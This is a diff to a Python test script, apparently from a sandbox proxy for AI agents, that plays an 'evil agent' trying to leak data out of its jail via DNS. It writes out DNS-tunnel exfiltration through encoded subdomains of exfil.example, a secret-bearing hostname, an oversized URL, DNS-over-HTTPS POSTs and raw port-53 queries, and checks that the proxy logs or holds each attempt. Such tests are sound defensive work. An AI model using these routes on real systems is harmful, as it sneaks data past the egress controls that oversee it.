@@ -1,24 +1,26 @@
 """Evil agent: exfiltrate through DNS.
 
 Runs INSIDE the jail, as the agent's user (python3 -c). Usage:
-<script> <tag> <marker> <allowed host> <canary name>
+<script> <tag> <marker> <allowed host> <canary name> <secret label>
 Prints one JSON object on its last line. ``marker`` is a unique label the test looks for in the
-fake resolver's log: no query carrying it may leave the VM. ``canary`` is an allowed name that no
-container answers for: the proxy must resolve it through the fake resolver, which proves the test
-would see a query if one left.
+fake resolver's log. ``canary`` is an allowed name that no container answers for: the proxy must
+resolve it through the fake resolver, which proves the test would see a query if one left.
+``secret label`` is a made-up key that the redaction knows by its shape (never a real one).
 
-Three ways out, all meant to fail:
+Since T10-3 reads to unknown hosts pass (decision 1), so a name is a way out: the proxy resolves
+the host of a read it lets through. What the gate still does, and what this checks:
 
-- ``through_proxy``: ask the proxy to resolve long encoded subdomains of an attacker domain, by
-  CONNECT and by absolute-form http://. The proxy resolves only hosts it is about to reach, and
-  an unknown host is refused before it is ever resolved, so no query for the name is sent.
+- ``through_proxy``: plain reads (CONNECT then GET, and absolute-form http://) of long encoded
+  subdomains of an attacker domain. They pass, but only once recorded: the proxy resolves a host
+  after backtide has the request in the black box, never before (the test compares the times).
+- ``guarded``: what decision 1's guard holds, so its name is never resolved: a read whose host
+  carries a secret (risk 3), a read whose URL is over 2 KiB, and a DNS-over-HTTPS POST (a write:
+  every write is held). The client gives up after a few seconds; the holds stay open, unresolved.
 - ``direct``: raw UDP and TCP on port 53 to Docker's embedded resolver (127.0.0.11), to two
   outside addresses and to the proxy. The outside ones are documentation addresses (RFC 5737), so
   even a jail that had regressed would send nothing to a real resolver (invariant 8); the script
   also reports whether the jail has a default route at all (/proc/net/route), sending nothing.
   Docker's resolver may answer locally (NXDOMAIN, or REFUSED): its rcode is reported.
-- ``doh``: DNS-over-HTTPS to known resolvers (dns.google, cloudflare-dns.com, 1.1.1.1) through
-  the proxy, which the allowed list refuses.
 
 The control resolves and reaches the allowed host, to show the way out still works for it.
 """
@@ -30,7 +32,8 @@ import ssl
 import struct
 import sys
 
-tag, marker, allowed, canary = sys.argv[1:5]
+tag, marker, allowed, canary, secret = sys.argv[1:6]
+GIVE_UP = 4  # seconds: a held request keeps its connection longer; the hold stays open
 PROXY = ("backtide-proxy", 8080)
 CONTEXT = ssl.create_default_context(cafile="/etc/backtide-ca/ca.pem")
 # Long encoded labels, as a DNS tunnel would carry stolen bytes. Each name holds the marker.
@@ -41,9 +44,9 @@ EXFIL_NAMES = [
 DOH_HOSTS = ["dns.google", "cloudflare-dns.com", "1.1.1.1"]
 
 
-def plain(target: str, path: str) -> object:
+def plain(target: str, path: str, timeout: float = 15) -> object:
     """Absolute-form http:// to the proxy (port 80), for a name the proxy would have to resolve."""
-    conn = http.client.HTTPConnection(*PROXY, timeout=15)
+    conn = http.client.HTTPConnection(*PROXY, timeout=timeout)
     try:
         conn.request("GET", f"http://{target}/{path}", headers={"Host": target})
         return conn.getresponse().status
@@ -53,12 +56,12 @@ def plain(target: str, path: str) -> object:
         conn.close()
 
 
-def tunnel(target: str, port: int = 443) -> object:
-    """CONNECT target:443, then an HTTPS GET inside: the request is what the proxy refuses (the
-    CONNECT only opens the tunnel, lazily, without resolving anything yet)."""
+def tunnel(target: str, port: int = 443, path: str = "dns", timeout: float = 15) -> object:
+    """CONNECT target:443, then an HTTPS GET inside: the request is what the proxy decides on
+    (the CONNECT only opens the tunnel, lazily, without resolving anything yet)."""
     where = f"[{target}]:{port}" if ":" in target else f"{target}:{port}"
     try:
-        with socket.create_connection(PROXY, timeout=15) as sock:
+        with socket.create_connection(PROXY, timeout=timeout) as sock:
             sock.sendall(f"CONNECT {where} HTTP/1.1\r\nHost: {where}\r\n\r\n".encode())
             head = b""
             while b"\r\n\r\n" not in head and len(head) < 8192:
@@ -69,7 +72,8 @@ def tunnel(target: str, port: int = 443) -> object:
             if not head.startswith(b"HTTP/") or int(head.split(b" ", 2)[1]) != 200:
                 return f"CONNECT: {head[:60]!r}"
             with CONTEXT.wrap_socket(sock, server_hostname=target) as tls:
-                tls.sendall(f"GET /{tag}/dns HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
+                request = f"GET /{tag}/{path} HTTP/1.1\r\nHost: {target}\r\n\r\n"
+                tls.sendall(request.encode())
                 line = tls.recv(200).split(b"\r\n", 1)[0]
                 return int(line.split(b" ", 2)[1]) if line.startswith(b"HTTP/") else repr(line)
     except (OSError, ValueError) as error:
@@ -124,13 +128,13 @@ def default_route() -> bool:
 
 
 def doh(host: str) -> object:
-    """DNS-over-HTTPS (RFC 8484) through the proxy: a GET of /dns-query with the packet."""
-    conn = http.client.HTTPSConnection(*PROXY, timeout=15, context=CONTEXT)
+    """DNS-over-HTTPS (RFC 8484) through the proxy: a POST of /dns-query with the packet."""
+    conn = http.client.HTTPSConnection(*PROXY, timeout=GIVE_UP, context=CONTEXT)
     conn.set_tunnel(host, 443)
     try:
         conn.request(
             "POST",
-            f"/dns-query?t={tag}",
+            f"/{tag}/dns-query",
             body=dns_query(f"{marker}-doh.exfil.example"),
             headers={
                 "content-type": "application/dns-message",
@@ -159,7 +163,16 @@ def control() -> object:
 through_proxy = {}
 for name in EXFIL_NAMES:
     through_proxy[f"CONNECT {name}"] = tunnel(name)
-    through_proxy[f"http {name}"] = plain(name, "dns-exfil")
+    through_proxy[f"http {name}"] = plain(name, f"{tag}/dns-exfil")
+
+# What decision 1's guard holds before any name is resolved (each name carries its own label).
+secret_name = f"{secret}.{marker}-s.exfil.example"
+long_name = f"{marker}-l.exfil.example"
+guarded = {
+    "secret_name": tunnel(secret_name, timeout=GIVE_UP),
+    "long_url": tunnel(long_name, path="long?d=" + "a1b2c3d4" * 300, timeout=GIVE_UP),
+    "doh_post": {host: doh(host) for host in DOH_HOSTS},
+}
 
 # Documentation addresses (RFC 5737) stand for outside resolvers: never a real one (invariant 8).
 resolvers = ["127.0.0.11", "192.0.2.53", "198.51.100.53", "backtide-proxy"]
@@ -169,7 +182,6 @@ for resolver in resolvers:
     direct[f"udp {resolver}"] = direct_udp(resolver, name)
     direct[f"tcp {resolver}"] = direct_tcp(resolver, name)
 
-doh_out = {host: doh(host) for host in DOH_HOSTS}
 # Last, the canary: an allowed name that no container answers for. The proxy resolves it (the
 # answer is NXDOMAIN, so the agent gets an error) and the test requires its query in the log.
 canary_status = plain(canary, f"{tag}/canary")
@@ -178,8 +190,10 @@ print(
     json.dumps(
         {
             "through_proxy": through_proxy,
+            "guarded": guarded,
+            "secret_name": secret_name,
+            "long_name": long_name,
             "direct": direct,
-            "doh": doh_out,
             "control": control(),
             "canary": canary_status,
             "default_route": default_route(),
